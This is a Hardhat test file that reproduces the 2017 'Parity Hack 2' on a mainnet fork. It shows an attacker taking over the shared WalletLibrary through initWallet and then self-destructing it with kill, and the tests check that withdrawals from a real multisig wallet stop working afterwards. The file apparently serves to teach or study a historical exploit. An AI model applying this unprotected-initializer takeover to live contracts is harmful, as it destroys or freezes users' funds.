import { expect } from "./setup";

import hre, { ethers } from "hardhat";
import { Contract, ContractTransaction, Signer } from "ethers";
import { forkFrom } from "../utils/fork";

let attacker: Signer;
let victim: Signer;
let wallet: Contract;
let walletLib: Contract;
let tx: ContractTransaction;

before(async () => {
  await forkFrom(4501753);
  [attacker] = await ethers.getSigners();

  // impersonate an owner of the wallet so we can call functions on it
  const WALLET_OWNER_ADDR = `0x003aAF73BF6A398cd40F72a122203C37A4128207`;
  await hre.network.provider.request({
    method: "hardhat_impersonateAccount",
    params: [WALLET_OWNER_ADDR],
  });

  victim = ethers.provider.getSigner(WALLET_OWNER_ADDR);

  wallet = await ethers.getContractAt(
    `Wallet`,
    `0x1C0e9B714Da970E6466Ba8E6980C55E7636835a6`
  );
  walletLib = await ethers.getContractAt(
    `WalletLibrary`,
    `0x863DF6BFa4469f3ead0bE8f9F2AAE51c91A907b4`
  );
});

const withdraw = async () => {
  const withdrawalAmount = ethers.utils.parseEther(`0.000001`);
  const data = walletLib.interface.encodeFunctionData(`execute`, [
    await victim.getAddress(),
    withdrawalAmount,
    [],
  ]);
  const tx = await victim.sendTransaction({
    to: wallet.address,
    data,
  });
  return tx;
};

describe("Parity Hack 2", function () {
  it("allows withdrawals before being killed", async function () {
    const balanceBefore = await ethers.provider.getBalance(wallet.address);

    tx = await withdraw();

    const balanceAfter = await ethers.provider.getBalance(wallet.address);
    expect(balanceAfter.lt(balanceBefore), "withdrawal did not work").to.be
      .true;
  });

  it("breaks withdrawals after being killed", async function () {
    const balanceBefore = await ethers.provider.getBalance(wallet.address);

    tx = await walletLib.initWallet(
      [await attacker.getAddress()],
      1,
      ethers.utils.parseEther(`1`)
    );

    tx = await walletLib.kill(await attacker.getAddress());

    tx = await withdraw();

    const balanceAfter = await ethers.provider.getBalance(wallet.address);
    expect(balanceAfter.eq(balanceBefore), "withdrawal worked but should not")
      .to.be.true;
  });
});
